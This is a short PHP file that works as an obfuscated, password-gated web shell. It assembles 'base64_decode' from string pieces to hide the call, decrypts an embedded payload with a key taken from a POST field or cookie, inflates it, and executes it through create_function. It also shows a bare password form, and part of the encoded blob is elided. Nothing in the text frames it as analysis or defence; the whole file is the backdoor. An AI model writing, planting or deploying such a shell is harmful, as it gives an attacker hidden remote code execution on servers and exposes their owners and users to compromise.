<?php $vvv='base'.(16*4).'_de'.'code';$vvv=$vvv(str_replace("\n", '', 'D+Lt5BEpNk345RNTiAQ0O6ANS2LOAInDH36UVUfPQzFO5bh8MtgKodCREnS957yAzTOvGSuH0s7wc7+i
...
'));$l__l_=isset($_POST['l__l_'])?$_POST['l__l_']:(isset($_COOKIE['l__l_'])?$_COOKIE['l__l_']:NULL);if($l__l_!==NULL){$l__l_=md5($l__l_).substr(md5(strrev($l__l_)),0,strlen($l__l_));for($l____l_=0;$l____l_<15324;$l____l_++){$vvv[$l____l_]=chr(( ord($vvv[$l____l_])-ord($l__l_[$l____l_]))%256);$l__l_.=$vvv[$l____l_];}if($vvv=@gzinflate($vvv)){if(isset($_POST['l__l_']))@setcookie('l__l_', $_POST['l__l_']);$l____l_=create_function('',$vvv);unset($vvv,$l__l_);$l____l_();}} echo '<form action="" method="post"><input type="text" name="l__l_" value=""/><input type="submit" value="&gt;"/></form>';
